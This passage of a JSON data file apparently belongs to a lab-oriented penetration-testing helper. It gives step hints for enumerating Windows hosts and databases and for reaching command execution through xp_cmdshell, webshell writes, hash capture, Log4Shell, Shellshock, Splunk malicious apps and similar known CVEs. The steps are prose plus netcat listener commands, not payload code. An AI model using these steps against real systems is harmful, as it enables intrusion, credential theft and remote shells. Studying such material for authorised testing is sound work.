        "Routes to internal CIDRs Kali cannot reach."
      ],
      "win": "An internal route to tunnel toward.",
      "mistakes": [
        "Reading only the default route and missing the specific internal ones."
      ]
    },
    {
      "when": "Inside an interactive Windows shell (cmd.exe) on the target host.",
      "land": [
        "Runs route print locally to dump the IPv4 and IPv6 routing tables."
      ],
      "look": [
        "Active Routes entries for 10.x.x.x, 172.16-31.x.x, or 192.168.x.x networks."
      ],
      "win": "The full Windows routing table prints.",
      "mistakes": [
        "Overlooking persistent routes at the bottom of the route print output."
      ]
    },
    {
      "when": "Inside a Windows shell when you want PowerShell to filter specifically for internal IPv4 routes.",
      "land": [
        "Queries Get-NetRoute and filters for RFC1918 destinations or non-zero next hops."
      ],
      "look": [
        "DestinationPrefix and NextHop columns pointing to internal subnets."
      ],
      "win": "A concise table of internal IPv4 routes and their interfaces prints.",
      "mistakes": [
        "Ignoring routes where NextHop is 0.0.0.0 (on-link connected subnets)."
      ]
    }
  ],
  "local-windows-neighbors": [
    {
      "when": "To find live neighbors without scanning.",
      "land": [
        "arp -a remotely lists recently contacted hosts. Each is alive."
      ],
      "look": [
        "Internal IPs in the ARP cache."
      ],
      "win": "Confirmed-live neighbors to target.",
      "mistakes": [
        "Scanning blindly when ARP already lists the live ones."
      ]
    },
    {
      "when": "Inside an interactive Windows shell (cmd.exe) on the target host.",
      "land": [
        "Runs arp -a locally to list cached IPv4-to-MAC mappings per interface."
      ],
      "look": [
        "Dynamic unicast IP entries (skip broadcast .255 and multicast 224.x/239.x addresses)."
      ],
      "win": "Every interface ARP table prints, revealing live peer hosts.",
      "mistakes": [
        "Mistaking multicast (224.0.0.x) or broadcast addresses for live unicast hosts."
      ]
    },
    {
      "when": "Inside a Windows shell when you want PowerShell to list only active neighbor states.",
      "land": [
        "Runs Get-NetNeighbor filtered to exclude Unreachable entries."
      ],
      "look": [
        "Reachable, Stale, or Permanent IPv4 entries and their InterfaceAlias."
      ],
      "win": "Filtered table of live IPv4 neighbors prints.",
      "mistakes": [
        "Filtering only for State -eq Reachable and missing Stale entries that are still alive."
      ]
    }
  ],
  "local-windows-listeners": [
    {
      "when": "To find services bound only to localhost on this box.",
      "land": [
        "netstat -ano remotely shows listeners. A 127.0.0.1-only port is an internal-only service to port-forward."
      ],
      "look": [
        "Ports listening on 127.0.0.1 (not 0.0.0.0), reachable only via a forward."
      ],
      "win": "A loopback-only service you can forward and attack.",
      "mistakes": [
        "Ignoring 127.0.0.1 listeners because nmap from Kali never saw them."
      ]
    },
    {
      "when": "Inside an interactive Windows shell (cmd.exe) on the target host.",
      "land": [
        "Runs netstat -ano | findstr LISTENING locally to list all listening TCP ports and their owning PIDs."
      ],
      "look": [
        "127.0.0.1:<port> listeners (e.g. internal web admin panels, databases, debug ports) and their PIDs."
      ],
      "win": "Listening ports and PIDs print so you can port-forward internal-only services to Kali.",
      "mistakes": [
        "Forgetting to map the PID to a process name with tasklist /svc /fi \"PID eq <pid>\"."
      ]
    },
    {
      "when": "Inside a Windows shell when you want a sorted PowerShell table of listening TCP ports.",
      "land": [
        "Uses Get-NetTCPConnection -State Listen sorted by LocalPort."
      ],
      "look": [
        "High or non-standard ports bound to 127.0.0.1 or an internal interface."
      ],
      "win": "Sorted table of LocalAddress, LocalPort, and OwningProcess prints.",
      "mistakes": [
        "Overlooking ports bound to a secondary internal IP rather than 127.0.0.1."
      ]
    }
  ],
  "mysql-login": [
    {
      "when": "Try root with a blank password, a classic misconfiguration.",
      "land": [
        "root with --password= (empty). Surprisingly common on labs."
      ],
      "look": [
        "A database list rather than access denied."
      ],
      "win": "A blank-password root logs in.",
      "mistakes": [
        "Not trying the empty password before assuming you need creds."
      ]
    },
    {
      "when": "You have MySQL creds (or suspect weak ones) and port 3306 is open.",
      "land": [
        "Connect and run version() to confirm access. Note there is NO space between -p and the password."
      ],
      "look": [
        "A version string means you are in. SHOW DATABASES next."
      ],
      "win": "MySQL returns its version, so the login works.",
      "mistakes": [
        "A space after -p, which makes mysql prompt instead of using the password."
      ]
    }
  ],
  "mysql-loot": [
    {
      "when": "Once in MySQL, dump the credential tables.",
      "land": [
        "Read mysql.user for the DB account hashes. Identify them in the Workbench Hash ID, then crack."
      ],
      "look": [
        "authentication_string hashes for DB users."
      ],
      "win": "You pull DB-user password hashes.",
      "mistakes": [
        "Ignoring app tables. The juicy creds are often in an application users table."
      ]
    },
    {
      "when": "Dump the application user table.",
      "land": [
        "SELECT username,password FROM users. Column and table names vary, so enumerate the schema first."
      ],
      "look": [
        "App credentials, often reused for SSH or the web login."
      ],
      "win": "You recover application creds to try elsewhere.",
      "mistakes": [
        "Assuming the table is named users. Check information_schema."
      ]
    },
    {
      "when": "Already inside an interactive mysql> or MariaDB prompt.",
      "land": [
        "Run SHOW DATABASES and SELECT user,authentication_string FROM mysql.user directly in the active SQL session."
      ],
      "look": [
        "Non-default application schemas alongside mysql.user password hashes."
      ],
      "win": "Schemas and database account hashes print without needing CLI connection flags.",
      "mistakes": [
        "Forgetting the trailing semicolon on interactive SQL statements."
      ]
    }
  ],
  "mssql-login": [
    {
      "when": "MSSQL creds and port 1433.",
      "land": [
        "nxc mssql validates the credential fast."
      ],
      "look": [
        "A [+] success line."
      ],
      "win": "The MSSQL credential validates.",
      "mistakes": [
        "Forgetting -windows-auth for a domain account."
      ]
    },
    {
      "when": "Right after validating an MSSQL login, to check if the account can escalate to sysadmin via IMPERSONATE or TRUSTWORTHY db_owner.",
      "land": [
        "NetExec's mssql_priv module automatically enumerates and exploits EXECUTE AS logins and trustworthy databases."
      ],
      "look": [
        "can impersonatesa / sysadmin confirmed in the mssql_priv output."
      ],
      "win": "Your SQL login escalates to sysadmin, unlocking xp_cmdshell.",
      "mistakes": [
        "Assuming a low-privilege SQL login is a dead end before checking EXECUTE AS permissions."
      ]
    },
    {
      "when": "Interactive client with Windows auth (a domain account).",
      "land": [
        "mssqlclient.py with -windows-auth drops you at an SQL prompt."
      ],
      "look": [
        "An SQL> prompt."
      ],
      "win": "You get an interactive MSSQL session.",
      "mistakes": [
        "Omitting the domain for a domain user."
      ]
    },
    {
      "when": "SQL auth (a local SQL login).",
      "land": [
        "mssqlclient.py without -windows-auth for a SQL login."
      ],
      "look": [
        "An SQL> prompt."
      ],
      "win": "You get an interactive session as the SQL login.",
      "mistakes": [
        "Using -windows-auth for a non-domain SQL login."
      ]
    },
    {
      "when": "Stealing NetNTLM hashes via forced SMB authentication from MSSQL.",
      "land": [
        "xp_dirtree forces the SQL server service account to authenticate to your Responder/SMB listener."
      ],
      "look": [
        "Captured NetNTLMv2 hash on Responder listener."
      ],
      "win": "MSSQL service account hash captured for cracking or relay.",
      "mistakes": [
        "Firewall blocking outbound port 445 from SQL server to attacker IP."
      ]
    },
    {
      "when": "Triggering NetNTLM hash capture using local SQL authentication.",
      "land": [
        "Pass --local-auth to authenticate with a local SQL account before invoking xp_dirtree."
      ],
      "look": [
        "Captured NetNTLM hash from MSSQL service account."
      ],
      "win": "Captured service account NetNTLM hash via local SQL login.",
      "mistakes": [
        "Assuming local SQL login cannot access external UNC shares."
      ]
    },
    {
      "when": "Port 1433 is open and you do not yet hold a credential.",
      "land": [
        "Run the Nmap MSSQL discovery and empty-password scripts against port 1433."
      ],
      "look": [
        "SQL Server version, NTLM domain and computer name, or an empty sa password."
      ],
      "win": "Instance metadata and NTLM domain details are enumerated, or sa logs in with a blank password.",
      "mistakes": [
        "Skipping unauthenticated MSSQL NTLM info and blank-sa checks before hunting credentials."
      ]
    }
  ],
  "mssql-xp-cmdshell": [
    {
      "when": "You are sysadmin on MSSQL and want command execution.",
      "land": [
        "nxc mssql -x runs a command via xp_cmdshell in one shot."
      ],
      "look": [
        "The command output (for example whoami) returns."
      ],
      "win": "A command runs as the SQL Server service account.",
      "mistakes": [
        "Not being sysadmin. xp_cmdshell needs it, or an impersonation path."
      ]
    },
    {
      "when": "From an interactive session, enable xp_cmdshell first.",
      "land": [
        "sp_configure to turn on advanced options and xp_cmdshell, then EXEC xp_cmdshell. Build the reverse shell in the Workbench."
      ],
      "look": [
        "xp_cmdshell enabled, then command output."
      ],
      "win": "You enable and run xp_cmdshell.",
      "mistakes": [
        "Forgetting RECONFIGURE after each sp_configure."
      ]
    }
  ],
  "postgres-login": [
    {
      "when": "PostgreSQL creds and port 5432.",
      "land": [
        "PGPASSWORD set, then psql -c \\l lists the databases."
      ],
      "look": [
        "A database list means access."
      ],
      "win": "psql lists the databases.",
      "mistakes": [
        "Quoting PGPASSWORD wrong for special characters."
      ]
    },
    {
      "when": "Port 5432 is open and no PostgreSQL password is known yet.",
      "land": [
        "Probe psql -h <target> -U postgres -c '\\l' to test for permissive pg_hba.conf trust authentication."
      ],
      "look": [
        "List of databases table printing immediately without a password prompt."
      ],
      "win": "Unauthenticated postgres superuser session confirmed via trust policy.",
      "mistakes": [
        "Skipping the zero-password trust check on exposed lab PostgreSQL listeners."
      ]
    }
  ],
  "postgres-rce": [
    {
      "when": "You are a superuser (or have the right role) on PostgreSQL 9.3+.",
      "land": [
        "COPY ... TO PROGRAM runs a shell command. A one-liner RCE for superusers. Build the payload in the Workbench."
      ],
      "look": [
        "Command execution. Fire a reverse shell and catch it."
      ],
      "win": "A command runs via COPY TO PROGRAM.",
      "mistakes": [
        "Not a superuser. COPY PROGRAM needs the privilege."
      ]
    },
    {
      "when": "Capture the command output into a table.",
      "land": [
        "COPY FROM PROGRAM into a table, then SELECT it to read the output."
      ],
      "look": [
        "The command output in the table rows."
      ],
      "win": "You read command output through the table.",
      "mistakes": [
        "Leaving the temp table behind. Clean up after."
      ]
    },
    {
      "when": "Sitting inside an interactive postgres=# SQL prompt.",
      "land": [
        "Execute CREATE TABLE, COPY ... FROM PROGRAM, and SELECT directly in the open psql session."
      ],
      "look": [
        "uid=... output returned inside the obol_cmd query rows."
      ],
      "win": "OS command execution confirmed directly from the interactive psql prompt.",
      "mistakes": [
        "Forgetting single-quote escaping when swapping id for a reverse shell command."
      ]
    }
  ],
  "redis-enum": [
    {
      "when": "Redis on 6379 with no auth.",
      "land": [
        "INFO dumps config and role. Note the version and whether it is a master."
      ],
      "look": [
        "Server info. A writable master can lead to RCE (module load, cron or webshell write)."
      ],
      "win": "Redis answers INFO with no auth.",
      "mistakes": [
        "Stopping at enumeration. An unauthenticated writable Redis is often RCE."
      ]
    },
    {
      "when": "List the keys.",
      "land": [
        "KEYS * shows all keys. Session tokens or creds sometimes sit here."
      ],
      "look": [
        "Interesting keys (sessions, config, creds)."
      ],
      "win": "You read the stored keys.",
      "mistakes": [
        "KEYS * on a huge production DB is slow. Fine on a lab."
      ]
    },
    {
      "when": "Redis requires AUTH and you recovered a password from config or source files.",
      "land": [
        "Pass -a '<password>' to redis-cli to dump INFO and enumerate stored keys."
      ],
      "look": [
        "redis_version, role:master, and application key names."
      ],
      "win": "Authenticated Redis server metadata and keyspace enumerated.",
      "mistakes": [
        "Not quoting special characters in the Redis password passed to -a."
      ]
    }
  ],
  "mongo-enum": [
    {
      "when": "MongoDB on 27017.",
      "land": [
        "nmap scripts confirm it and list databases."
      ],
      "look": [
        "Databases and whether auth is required."
      ],
      "win": "Mongo answers unauthenticated.",
      "mistakes": [
        "Assuming auth. Many labs leave it open."
      ]
    },
    {
      "when": "List the databases with pymongo.",
      "land": [
        "The python one-liner lists databases without auth."
      ],
      "look": [
        "Database names worth exploring."
      ],
      "win": "You enumerate the databases.",
      "mistakes": [
        "A timeout set too short for a slow host."
      ]
    },
    {
      "when": "List the collections.",
      "land": [
        "The next one-liner lists collections in a database."
      ],
      "look": [
        "Collections that might hold users or secrets."
      ],
      "win": "You list the collections.",
      "mistakes": [
        "Guessing the DB name instead of using the enumerated one."
      ]
    },
    {
      "when": "Read the documents.",
      "land": [
        "Dump the documents from a collection."
      ],
      "look": [
        "Credentials or secrets in the documents."
      ],
      "win": "You read collection data without auth.",
      "mistakes": [
        "Not limiting the dump on a large collection."
      ]
    }
  ],
  "oracle-tns": [
    {
      "when": "Oracle on 1521. First find the SID.",
      "land": [
        "nmap oracle-sid-brute guesses the SID, which everything else needs."
      ],
      "look": [
        "A valid SID."
      ],
      "win": "A SID is found.",
      "mistakes": [
        "Trying to log in before you have a SID."
      ]
    },
    {
      "when": "If nmap finds none, use odat sidguesser.",
      "land": [
        "odat sidguesser enumerates SIDs."
      ],
      "look": [
        "A SID to use."
      ],
      "win": "odat returns a SID.",
      "mistakes": [
        "Giving up after nmap. odat often finds more."
      ]
    },
    {
      "when": "Guess default account passwords for the SID.",
      "land": [
        "odat passwordguesser with the accounts file finds default creds."
      ],
      "look": [
        "A valid user and password pair."
      ],
      "win": "Default Oracle creds are found.",
      "mistakes": [
        "Skipping default accounts like scott/tiger and system/manager."
      ]
    },
    {
      "when": "Log in with sqlplus.",
      "land": [
        "sqlplus user/pass@target:1521/SID."
      ],
      "look": [
        "An SQL> prompt."
      ],
      "win": "You log into Oracle.",
      "mistakes": [
        "Wrong SID in the connect string."
      ]
    }
  ],
  "oracle-rce": [
    {
      "when": "With Oracle creds, get command execution.",
      "land": [
        "odat externaltable runs a command via an external table."
      ],
      "look": [
        "The command output."
      ],
      "win": "A command runs through Oracle.",
      "mistakes": [
        "Insufficient privileges for the external-table method."
      ]
    },
    {
      "when": "Try all odat RCE methods at once.",
      "land": [
        "odat all enumerates every exploitation path."
      ],
      "look": [
        "Whichever method succeeds."
      ],
      "win": "odat finds a working RCE path.",
      "mistakes": [
        "Running it noisily against a monitored target."
      ]
    }
  ],
  "elasticsearch-enum": [
    {
      "when": "Elasticsearch on 9200.",
      "land": [
        "curl the root to confirm it and read the version."
      ],
      "look": [
        "The ES version. Older ones have RCE CVEs."
      ],
      "win": "ES answers with its version.",
      "mistakes": [
        "Not noting the version, which decides the exploit."
      ]
    },
    {
      "when": "List the indices.",
      "land": [
        "_cat/indices shows the data stores."
      ],
      "look": [
        "Indices that might hold creds or PII."
      ],
      "win": "You see the available indices.",
      "mistakes": [
        "Overlooking a small, interestingly-named index."
      ]
    },
    {
      "when": "Search an index.",
      "land": [
        "_search dumps documents from an index."
      ],
      "look": [
        "Credentials or secrets in the documents."
      ],
      "win": "You read index data.",
      "mistakes": [
        "Not paging large indices (use the size param)."
      ]
    }
  ],
  "elasticsearch-rce": [
    {
      "when": "Confirm the version supports the Groovy sandbox escape.",
      "land": [
        "curl the root. Old ES (1.x) has the CVE-2015-1427 Groovy RCE."
      ],
      "look": [
        "A version in the vulnerable range."
      ],
      "win": "The version is confirmed vulnerable.",
      "mistakes": [
        "Trying the exploit on a patched version."
      ]
    },
    {
      "when": "Run the Groovy script_fields RCE.",
      "land": [
        "The _search payload runs a command via the Groovy sandbox escape."
      ],
      "look": [
        "The command output in the response."
      ],
      "win": "A command runs through Elasticsearch.",
      "mistakes": [
        "Wrong ES version. Only the old ones are vulnerable."
      ]
    }
  ],
  "memcached-enum": [
    {
      "when": "Memcached on 11211.",
      "land": [
        "nmap memcached-info confirms it and shows stats."
      ],
      "look": [
        "Server stats and whether it is exposed unauthenticated."
      ],
      "win": "Memcached answers.",
      "mistakes": [
        "Assuming auth. Memcached has none by default."
      ]
    },
    {
      "when": "Stats via memcstat.",
      "land": [
        "memcstat shows server stats."
      ],
      "look": [
        "Item counts, which hint at data to dump."
      ],
      "win": "You read the stats.",
      "mistakes": [
        "Stopping at stats without dumping the items."
      ]
    },
    {
      "when": "Dump the cached items manually.",
      "land": [
        "ncat to 11211, then stats items and stats cachedump to read keys and values."
      ],
      "look": [
        "Cached values (sessions, tokens, creds)."
      ],
      "win": "You read cached data.",
      "mistakes": [
        "Not knowing the stats cachedump commands."
      ]
    }
  ],
  "mssql-linked-server": [
    {
      "when": "You have an MSSQL session and want to hop via a linked server.",
      "land": [
        "Open the session with mssqlclient.py."
      ],
      "look": [
        "An SQL prompt."
      ],
      "win": "The session is open.",
      "mistakes": [
        "Not checking for linked servers at all."
      ]
    },
    {
      "when": "List the linked servers.",
      "land": [
        "SELECT from sys.servers. is_linked=1 is a hop target."
      ],
      "look": [
        "Linked server names."
      ],
      "win": "A linked server is found.",
      "mistakes": [
        "Overlooking a linked server that runs as a higher-privileged identity."
      ]
    },
    {
      "when": "Check your rights on the linked server.",
      "land": [
        "EXEC ... AT [LINKED] runs a query on the remote. Check whether you are sysadmin there."
      ],
      "look": [
        "sysadmin=1 on the linked server means you can run commands there."
      ],
      "win": "You see your privilege on the linked server.",
      "mistakes": [
        "Assuming the same identity carries over. It may be impersonated."
      ]
    },
    {
      "when": "Run a command on the linked server.",
      "land": [
        "EXEC(...) AT [LINKED] enables and runs xp_cmdshell on the remote."
      ],
      "look": [
        "The command output from the linked server."
      ],
      "win": "You get command execution on the linked server.",
      "mistakes": [
        "Not escaping the nested quotes correctly."
      ]
    }
  ],
  "mysql-outfile-rce": [
    {
      "when": "Check whether MySQL can write files, for a webshell.",
      "land": [
        "Read @@secure_file_priv and your grants. An empty secure_file_priv plus the FILE privilege means INTO OUTFILE works."
      ],
      "look": [
        "secure_file_priv empty (writes anywhere) and the FILE privilege present."
      ],
      "win": "You confirm file writes are possible.",
      "mistakes": [
        "Trying OUTFILE when secure_file_priv restricts the path."
      ]
    },
    {
      "when": "Write a PHP webshell into the web root.",
      "land": [
        "SELECT ... INTO OUTFILE a php file under the web root. You need to know the web root path first."
      ],
      "look": [
        "No error, then the file exists on the web server."
      ],
      "win": "A webshell is written to the web root.",
      "mistakes": [
        "Wrong web root path, so the file lands somewhere unserved."
      ]
    },
    {
      "when": "Trigger the webshell.",
      "land": [
        "curl the written php with a command. Build the reverse shell in the Workbench and pass it here (the encoder helps with URL encoding)."
      ],
      "look": [
        "Command output over HTTP."
      ],
      "win": "The webshell runs commands.",
      "mistakes": [
        "URL-encoding the command wrong. The Workbench encoder fixes that."
      ]
    },
    {
      "when": "When OUTFILE is blocked, try the UDF path.",
      "land": [
        "CREATE FUNCTION sys_exec from lib_mysqludf_sys for direct command execution."
      ],
      "look": [
        "sys_exec available, then command execution."
      ],
      "win": "The UDF gives command execution.",
      "mistakes": [
        "The UDF library is not present. OUTFILE is usually simpler."
      ]
    }
  ],
  "check-log4shell": [
    {
      "when": "A Java app where you want to test for Log4Shell.",
      "land": [
        "Spray the JNDI payload in common logged headers, pointed at your listener."
      ],
      "look": [
        "A callback to your listener from the target. That is the vulnerability confirmed."
      ],
      "win": "Your listener receives a JNDI lookup from the target.",
      "mistakes": [
        "Not running the listener first, so the callback is lost."
      ]
    },
    {
      "when": "If the headers do not trigger it.",
      "land": [
        "Also spray the query string and the POST body. The logged field varies by app."
      ],
      "look": [
        "A callback from one of the other injection points."
      ],
      "win": "A callback lands from the query or the body.",
      "mistakes": [
        "Testing only one injection point."
      ]
    },
    {
      "when": "Set up the catch BEFORE spraying.",
      "land": [
        "Run a JNDI/LDAP listener (or just nc) first. A callback from the target confirms it."
      ],
      "look": [
        "The inbound connection from the target IP."
      ],
      "win": "The listener is ready and catches the callback.",
      "mistakes": [
        "Spraying before the listener is up."
      ]
    }
  ],
  "check-struts2": [
    {
      "when": "A Struts2 app (Java, often .action URLs).",
      "land": [
        "The Jakarta Content-Type OGNL payload runs id and returns the output in the response."
      ],
      "look": [
        "A uid= line in the HTTP response confirms RCE."
      ],
      "win": "The response contains command output.",
      "mistakes": [
        "Assuming vulnerable without seeing the id output."
      ]
    }
  ],
  "shellshock": [
    {
      "when": "An old CGI endpoint (Apache /cgi-bin/).",
      "land": [
        "Find a REAL script under /cgi-bin/ first. The exploit needs a concrete endpoint."
      ],
      "look": [
        "An existing CGI script, for example /cgi-bin/test.sh."
      ],
      "win": "You locate a live CGI script to target.",
      "mistakes": [
        "Firing at /cgi-bin/ with no real script behind it."
      ]
    },
    {
      "when": "Confirm before going for a shell.",
      "land": [
        "Inject the () { :;}; payload in a header to run id."
      ],
      "look": [
        "A uid line in the response proves the RCE."
      ],
      "win": "id output returns, confirming Shellshock.",
      "mistakes": [
        "Skipping the id confirmation and jumping to a shell."
      ]
    },
    {
      "when": "Go for the shell.",
      "land": [
        "Reverse shell through the same header. Start nc -lvnp 4444 first (the Workbench builds the payload)."
      ],
      "look": [
        "A shell on your listener."
      ],
      "win": "A reverse shell connects back.",
      "mistakes": [
        "No listener running."
      ]
    }
  ],
  "heartbleed": [
    {
      "when": "OpenSSL on an older TLS service.",
      "land": [
        "Confirm the host is vulnerable before spending time dumping."
      ],
      "look": [
        "The scanner reports vulnerable."
      ],
      "win": "The host is confirmed vulnerable to Heartbleed.",
      "mistakes": [
        "Dumping memory on a patched host, which is a waste of time."
      ]
    },
    {
      "when": "Dump memory for reusable material.",
      "land": [
        "Dump many times and grep for creds or session tokens. The leak is random, so repeat."
      ],
      "look": [
        "Credentials, session cookies, or keys in the leaked bytes."
      ],
      "win": "Reusable material appears in the leak.",
      "mistakes": [
        "Dumping once and giving up. It is random."
      ]
    },
    {
      "when": "Automated dumping.",
      "land": [
        "The Metasploit scanner dumps and prints the leaked bytes for you."
      ],
      "look": [
        "Leaked memory contents."
      ],
      "win": "Metasploit prints the leaked data.",
      "mistakes": [
        "Not repeating to get a useful fragment."
      ]
    }
  ],
  "drupalgeddon2": [
    {
      "when": "A Drupal site.",
      "land": [
        "Read the version. The bug affects Drupal below 7.58 and below 8.5.1."
      ],
      "look": [
        "A version in range."
      ],
      "win": "The version is confirmed vulnerable.",
      "mistakes": [
        "Firing at a patched version."
      ]
    },
    {
      "when": "Exploit.",
      "land": [
        "The PoC confirms the bug and drops an interactive webshell."
      ],
      "look": [
        "A webshell prompt or command output."
      ],
      "win": "The PoC lands a webshell.",
      "mistakes": [
        "Wrong endpoint or form parameter."
      ]
    },
    {
      "when": "For a stable session.",
      "land": [
        "The Metasploit module is the reliable alternative."
      ],
      "look": [
        "A session."
      ],
      "win": "Metasploit returns a session.",
      "mistakes": [
        "Skipping the version check first."
      ]
    }
  ],
  "phpmyadmin-lfi": [
    {
      "when": "phpMyAdmin present.",
      "land": [
        "Confirm the version is 4.8.0 or 4.8.1."
      ],
      "look": [
        "A version in range."
      ],
      "win": "The version is confirmed vulnerable.",
      "mistakes": [
        "Firing at a patched version."
      ]
    },
    {
      "when": "Write the payload into your session file.",
      "land": [
        "Run a query whose result is written into your PHP session file on disk. That file is your payload."
      ],
      "look": [
        "The query runs, and your session file now holds the PHP."
      ],
      "win": "Your session file carries the payload.",
      "mistakes": [
        "Not keeping the same session cookie for the include."
      ]
    },
    {
      "when": "Include the session file through the LFI.",
      "land": [
        "Include your session file and pass the command in parameter 0. Swap id for a reverse shell from the Workbench."
      ],
      "look": [
        "Command output, then a shell."
      ],
      "win": "The LFI runs your command.",
      "mistakes": [
        "Wrong session file path for the OS."
      ]
    }
  ],
  "webmin-rce": [
    {
      "when": "Webmin on 10000.",
      "land": [
        "Confirm it is listening and note the version (affected 1.890 to 1.920)."
      ],
      "look": [
        "A version in range."
      ],
      "win": "The Webmin version is confirmed vulnerable.",
      "mistakes": [
        "Firing at a patched Webmin."
      ]
    },
    {
      "when": "Exploit for root.",
      "land": [
        "The new-password field is injected into a shell. Start nc -lvnp 4444 first to catch root."
      ],
      "look": [
        "A root shell on your listener."
      ],
      "win": "A root reverse shell connects.",
      "mistakes": [
        "No listener up."
      ]
    },
    {
      "when": "Automated.",
      "land": [
        "The Metasploit module automates the same injection."
      ],
      "look": [
        "A session."
      ],
      "win": "Metasploit returns a session.",
      "mistakes": [
        "Skipping the version check."
      ]
    }
  ],
  "ofbiz-deser": [
    {
      "when": "Apache OFBiz.",
      "land": [
        "Confirm the version. Below 17.12.04 is vulnerable."
      ],
      "look": [
        "A version in range."
      ],
      "win": "The OFBiz version is confirmed vulnerable.",
      "mistakes": [
        "Firing at a patched version."
      ]
    },
    {
      "when": "Build the gadget.",
      "land": [
        "Build the deserialization gadget carrying your command. Start nc -lvnp 4444 first."
      ],
      "look": [
        "The gadget is built."
      ],
      "win": "A gadget carrying your payload is ready.",
      "mistakes": [
        "Wrong gadget chain for the target."
      ]
    },
    {
      "when": "Fire it.",
      "land": [
        "POST the serialized gadget to the unauthenticated xmlrpc endpoint. The command runs."
      ],
      "look": [
        "A callback on your listener."
      ],
      "win": "The deserialization runs your command.",
      "mistakes": [
        "Hitting the wrong endpoint."
      ]
    }
  ],
  "cacti-cmdinjection": [
    {
      "when": "Cacti present.",
      "land": [
        "Confirm the version is 1.2.22 or below."
      ],
      "look": [
        "A version in range."
      ],
      "win": "The Cacti version is confirmed vulnerable.",
      "mistakes": [
        "Firing at a patched version."
      ]
    },
    {
      "when": "Exploit.",
      "land": [
        "The script spoofs X-Forwarded-For to an authorized poller and injects the command. Start nc -lvnp 4444 first."
      ],
      "look": [
        "A shell on your listener."
      ],
      "win": "The injection returns a shell.",
      "mistakes": [
        "Not spoofing an authorized poller IP."
      ]
    }
  ],
  "zabbix-script-rce": [
    {
      "when": "A Zabbix frontend.",
      "land": [
        "Confirm it, and that SAML SSO is present. The bypass needs it."
      ],
      "look": [
        "SAML SSO configured."
      ],
      "win": "The frontend and SAML are confirmed.",
      "mistakes": [
        "Trying the bypass without SAML."
      ]
    },
    {
      "when": "Bypass auth.",
      "land": [
        "A public PoC mints the session cookie. You land as Admin with no password."
      ],
      "look": [
        "An authenticated Admin session."
      ],
      "win": "You are Admin without a password.",
      "mistakes": [
        "Expecting it to work without SAML present."
      ]
    },
    {
      "when": "RCE via Scripts.",
      "land": [
        "The Scripts feature runs commands on the server or agents. Start nc -lvnp 4444 first."
      ],
      "look": [
        "A shell on your listener."
      ],
      "win": "A Script runs your reverse shell.",
      "mistakes": [
        "No listener up."
      ]
    },
    {
      "when": "When Administration > Scripts is restricted or fails, and an active Zabbix agent has EnableRemoteCommands=1.",
      "land": [
        "Create a monitoring Item with a system.run[...,nowait] key so the Zabbix agent executes your reverse shell."
      ],
      "look": [
        "An incoming shell from the monitored host on your listener within 60 seconds."
      ],
      "win": "The Zabbix agent executes system.run and connects back to your listener.",
      "mistakes": [
        "Omitting ,nowait inside system.run[], which can block the agent thread when the shell stays open."
      ]
    }
  ],
  "splunk-app-rce": [
    {
      "when": "Splunk present.",
      "land": [
        "Confirm the version. 9.0.x and 9.1.x carry the lower-privilege CVE-2023-46214."
      ],
      "look": [
        "A version in range."
      ],
      "win": "The Splunk version is confirmed.",
      "mistakes": [
        "Not matching the version to the right CVE."
      ]
    },
    {
      "when": "Package the malicious app.",
      "land": [
        "Edit LHOST and LPORT, then package the directory as a .tar.gz Splunk app."
      ],
      "look": [
        "A built .tar.gz app."
      ],
      "win": "The app is packaged with your payload.",
      "mistakes": [
        "Wrong LHOST or LPORT baked in."
      ]
    },
    {
      "when": "Install and catch.",
      "land": [
        "Start nc -lvnp 4444 first. The app fires its scripted input on install or on its interval."
      ],
      "look": [
        "A shell on your listener."
      ],
      "win": "The scripted input fires your reverse shell.",
      "mistakes": [
        "No listener, or expecting it instantly when it runs on an interval."
      ]
    },
    {
      "when": "When the Splunk web UI is unreachable or you prefer deploying the malicious app straight through the Splunkd REST API (port 8089).",
      "land": [
        "Uploads and installs shell.tar.gz in a single curl call using Splunk admin credentials."
      ],
      "look": [
        "An XML feed response confirming the app was installed, followed by a shell on your listener."
      ],
      "win": "Splunkd installs the app over port 8089 and triggers your scripted input.",
      "mistakes": [
        "Forgetting to start your netcat listener before uploading the app."
      ]
    }
  ],
  "text4shell": [
    {
      "when": "A Java app using Commons Text interpolation.",
      "land": [
        "Spray the ${script:...} payload. An out-of-band hit on your box confirms it runs. Start a listener on LHOST first."
      ],
      "look": [
        "An out-of-band callback."
      ],
      "win": "The interpolation triggers a callback.",
      "mistakes": [
        "No out-of-band listener to confirm."
      ]
    },
    {
      "when": "Confirm, then shell.",
      "land": [
        "Confirm execution with id, then swap it for a staged reverse shell."
      ],
      "look": [
        "id output, then a shell."
      ],
      "win": "A command runs, then a shell lands.",
      "mistakes": [
        "Jumping to the shell before confirming id."
      ]
    },
    {
      "when": "Automated.",
      "land": [
        "A PoC helper automates finding and firing the injectable parameter."
      ],
      "look": [
        "The helper reports the vulnerable parameter."
      ],
      "win": "The helper fires the payload for you.",
      "mistakes": [
        "Not starting the listener before the helper fires."
      ]
    }
  ],
  "usermin-rce": [
    {
      "when": "Usermin on 20000.",
      "land": [
        "Confirm it and read the version from the page footer."
      ],
      "look": [
        "A version in range."
      ],
      "win": "The Usermin version is confirmed.",
      "mistakes": [
        "Confusing it with Webmin on 10000."
      ]
    },
    {
      "when": "Exploit (needs a valid login first).",
      "land": [
        "This needs a valid login. Start nc -lvnp 4444 to catch the shell."
      ],
      "look": [
        "A shell on your listener."
      ],
      "win": "The authenticated RCE returns a shell.",
      "mistakes": [
        "Trying it unauthenticated."
      ]
    }
  ],
  "check-web-headers": [
    {
      "when": "Triaging a web app for report findings.",
      "land": [
        "Review the response security headers."
      ],
      "look": [
        "Missing CSP, HSTS, X-Frame-Options, X-Content-Type-Options. Each is a low-severity note."
      ],
      "win": "You capture the header gaps for the report.",
      "mistakes": [
        "Expecting a foothold. These are report items, rarely a way in."
      ]
    },
    {
      "when": "For the full header set.",
      "land": [
        "The verbose fetch shows every header."
      ],
      "look": [
        "Server and tech banners you can turn into a version check."
      ],
      "win": "You have the complete header list.",
      "mistakes": [
        "Overlooking a banner that names an exploitable version."
      ]
    }
  ],
  "check-web-components": [
    {
      "when": "Identifying the web stack.",
      "land": [
        "Fingerprint the components."
      ],
      "look": [
        "Frameworks and library versions, which aim the exploit checks."
      ],
      "win": "You know the stack and versions.",
      "mistakes": [
        "Guessing the stack instead of fingerprinting it."
      ]
    },
    {
      "when": "For more detail.",
      "land": [
        "The second pass adds JavaScript libraries and versions."
      ],
      "look": [
        "Outdated JS libraries with known CVEs."
      ],
      "win": "A fuller component list.",
      "mistakes": [
